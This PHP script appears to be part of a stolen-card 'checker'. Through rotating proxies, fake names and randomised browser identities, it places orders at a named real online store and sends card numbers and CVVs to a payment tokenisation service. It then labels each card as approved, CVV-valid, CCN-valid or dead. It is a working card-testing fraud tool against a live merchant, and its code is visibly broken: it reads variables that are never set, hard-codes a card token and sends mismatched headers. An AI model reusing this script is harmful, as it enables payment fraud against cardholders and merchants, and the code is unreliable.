<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) $retry++;

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$r1 = $this->curlx->Get('https://www.asseenontvwebstore.com/Lil-Vampire-Pacifier-p/vamp-paci.htm', null, $cookie, $server['proxy']);

if (!$r1->success) goto start;

$data = 'QTY.VAMP-PACI=1&btnaddtocart=Add+To+Cart&ReplaceCartID=&ProductCode=VAMP-PACI&e=&ReturnTo=ShoppingCart.asp';

$r2 = $this->curlx->Post('https://www.asseenontvwebstore.com/ProductDetails.asp?ProductCode=VAMP-PACI', $data, null, $cookie, $server['proxy']);

if (!$r2->success) goto start;

$r3 = $this->curlx->Get('https://www.asseenontvwebstore.com/one-page-checkout.asp', null, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$spreedlyEnvKey = $this->getstr($r3->body, "environmentKey: '", "'");

$ua = 'Mozilla/5.0 (Windows NT ' . rand(11, 99) . '.0; Win64; x64) AppleWebKit/' . rand(111, 999) . '.' . rand(11, 99) . ' (KHTML, like Gecko) Chrome/' . rand(11, 99) . '.0.' . rand(1111, 9999) . '.' . rand(111, 999) . ' Safari/' . rand(111, 999) . '.' . rand(11, 99) . '';

$data = '{"environment_key":"'.$spreedlyEnvKey.'","payment_method":{"credit_card":{"number":"'.$cc.'","verification_value":"'.$cvv.'","full_name":"'.$fake->first.' '.$fake->last.'","month":"'.$mm.'","year":"'.$yyyy.'"}}}';

$headers = [
	'authority: core.spreedly.com',
	'accept: */*',
	'accept-language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'content-type: application/json',
	'origin: https://core.spreedly.com',
	'referer: https://core.spreedly.com/v1/embedded/number-frame-1.95.html',
	'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-origin',
	'spreedly-environment-key: '.$spreedlyEnvKey.'',
	'user-agent: '.$ua.''
];

$r3 = $this->curlx->Post('https://core.spreedly.com/v1/payment_methods/restricted.json?from=iframe&v=1.99', $data, $headers, $cookie, $server['proxy']);

if (!$r3->success) goto start;

$json_r3 = json_decode($r3->body);

if (!isset($json_r3->transaction->payment_method->token)) {
	$empty = 'Third Request Token is Empty';

	goto start;
}

$token = $json_r3->transaction->payment_method->token;

$data = 'CardTokenProvider=SPREEDLY&CardToken=NVcShq4T6oCnNA9p5gEweOeQmrt&PaymentMethodFingerprint=246d708dba91620b7a71bf91cac0789948d7&isSpreedly3DSEnabled=False&browserInfo=eyJ3aWR0aCI6NDEyLCJoZWlnaHQiOjg0NiwiZGVwdGgiOjI0LCJ0aW1lem9uZSI6MzAwLCJ1c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBTTS1OOTYwVSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEwMy4wLjUwNjAuMTA0IE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiamF2YSI6ZmFsc2UsImxhbmd1YWdlIjoiZW4tVVMiLCJicm93c2VyX3NpemUiOiIwMyIsImFjY2VwdF9oZWFkZXIiOiJ0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjkifQ%3D%3D&CC_Last4=9287&SpreedlyCardTypeIdentifier=visa&PCIaaS_CardId=&card_used_from_saved=0&My_Saved_Billing=Select&remove_billingid=&BillingFirstName=Jhon&BillingLastName=Doe&BillingCompanyName=&BillingAddress1=12+main+street&BillingAddress2=&BillingCity=Brewster&BillingCityChanged=N&BillingCountry=United+States&BillingCountryChanged=N&BillingState_Required=Y&BillingState_dropdown=NY&BillingState=NY&BillingStateChanged=N&BillingPostalCode=10509&BillingPostalCodeChanged=N&BillingPhoneNumber=2564567654&My_Saved_Shipping=Select&remove_shipid=&ShipFirstName=Jhon&ShipTo=use_different_address&ShipLastName=Doe&ShipCompanyName=&ShipAddress1=12+main+street&ShipAddress2=&ShipCity=Brewster&ShipCityChanged=N&ShipCountry=United+States&ShipState_Required=Y&ShipState_dropdown=NY&ShipState=NY&ShipPostalCode=10509&ShipPostalCodeChanged=N&ShipPhoneNumber=2564567654&ShipResidential=Y&ShippingSpeedChoice=805&hidden_btncalc_shipping=&PaymentMethod=Credit+Card&CardHoldersName=Jhon+doe&CC_ExpDate_Month=07&CC_ExpDate_Year=2029&PaymentMethodType=Credit+Card&last-form-submit-date=Fri+Feb+03+2023+19%3A15%3A02+GMT-0500+%28Eastern+Standard+Time%29&Using_Existing_Account=Y&Quantity1=1&CouponCode=&Previous_Tax_Percents=000&Previous_Calc_Shipping=6.45&btnSubmitOrder=DoThis';

$headers = [
	'authority: platform.funraise.io',
	'accept: application/json',
	'accept-language: en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7',
	'content-type: application/json; charset=UTF-8',
	'origin: https://assets.funraise.io',
	'referer: https://assets.funraise.io/',
	'sec-ch-ua: "Chromium";v="103", ".Not/A)Brand";v="99"',
	'sec-ch-ua-mobile: ?1',
	'sec-ch-ua-platform: "Android"',
	'sec-fetch-dest: empty',
	'sec-fetch-mode: cors',
	'sec-fetch-site: same-site',
	'user-agent: '.$ua.'',
	'x-org-id: '.$orgID.''
];

$r4 = $this->curlx->Post('https://www.asseenontvwebstore.com/one-page-checkout.asp', $data, $headers, $cookie, $server['proxy']);

if (!$r4->success) goto start;

if (strpos($r5, 'Succeeded') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => 'CHARGED - Succeeded!'];
} elseif (strpos($json_r5->message, 'Address not verified') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "AVS FAILED - $msg"];
} elseif (strpos($msg, 'CVV matches') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CVV CARD - $msg"];
} elseif (strpos($json_r5->message, 'CVV does not match') !== false) {
	$status = ['status' => 'APPROVED', 'emoji' => '✅', 'msg' => "CCN CARD - $msg"];
} else {
	$status = ['status' => 'DECLINED', 'emoji' => '❌', 'msg' => "DEAD - $msg"];
}

end: